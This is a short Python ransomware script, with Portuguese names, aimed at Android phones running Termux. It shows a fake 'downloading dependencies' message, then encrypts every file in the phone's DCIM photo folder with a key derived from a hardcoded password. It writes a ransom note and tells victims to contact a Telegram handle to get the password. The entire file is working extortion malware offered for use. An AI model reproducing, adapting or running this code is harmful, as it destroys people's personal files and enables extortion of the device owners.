from cryptography.fernet import Fernet
import base64
import hashlib
import os
from colorama import Fore, Back, Style, init

init(autoreset=True)

caminho = "/data/data/com.termux/files/home/storage/dcim"
pascoalk2 = "8080"

def gerar_chave(senha):
    return base64.urlsafe_b64encode(hashlib.sha256(senha.encode()).digest())
print(Fore.GREEN + 'Baixando dependências...')

def criptografar_arquivos():
    chave = gerar_chave(pascoalk2)
    f = Fernet(chave)

    arquivos = []
    for root, dirs, files in os.walk(caminho):
        for file in files:
            if file in ["madara.py", "chave.key", "⚠️AVISO⚠️.txt"]:
                continue
            arquivos.append(os.path.join(root, file))

    for file in arquivos:
        with open(file, "rb") as arquivo:
            conteudo = arquivo.read()
        conteudo_encrypted = f.encrypt(conteudo)
        with open(file, "wb") as arquivo:
            arquivo.write(conteudo_encrypted)

    print(Fore.RED + "🚫🔒 Tudo foi criptografado com sucesso! 🔒🚫")
    print(Fore.RED + "Arquivos mais importantes foram criptografados")
    print(Fore.RED + "Para descriptografar: 🔑 t.me/Anonimo_onion 🔑")

def descriptografar_arquivos():
    chave = gerar_chave(pascoalk2)
    f = Fernet(chave)

    arquivos = []
    for root, dirs, files in os.walk(caminho):
        for file in files:
            if file in ["madara.py", "chave.key", "⚠️AVISO⚠️.txt"]:
                continue
            arquivos.append(os.path.join(root, file))

    for file in arquivos:
        with open(file, "rb") as arquivo:
            conteudo = arquivo.read()
        conteudo_decrypted = f.decrypt(conteudo)
        with open(file, "wb") as arquivo:
            arquivo.write(conteudo_decrypted)

    print(Fore.GREEN + "✅ Tudo foi descriptografado com sucesso! ✅")

def main():
    aviso_path = os.path.join(caminho, "⚠️AVISO⚠️.txt")
    if not os.path.exists(aviso_path):
        criptografar_arquivos()
        with open(aviso_path, "w") as script_marker:
            script_marker.write("Resgate os dados com: t.me/anonimo_onion")
    else:
        print(Fore.CYAN + "🔓 Para descriptografar os arquivos, você precisa da senha!")
        print(Fore.CYAN + "🔑 Entre em contato com: t.me/Anonimo_onion para obter a senha!")
        senha_input = input(Fore.CYAN + "🔑 Digite a senha que você obteve com o @Anonimo_onion: ")
        
        if senha_input == pascoalk2:
            descriptografar_arquivos()
            os.remove(aviso_path)
        else:
            print(Fore.YELLOW + "❗ Senha incorreta. Entre em contato com @Anonimo_onion para obter a senha correta! ❗")

if __name__ == "__main__":
    main()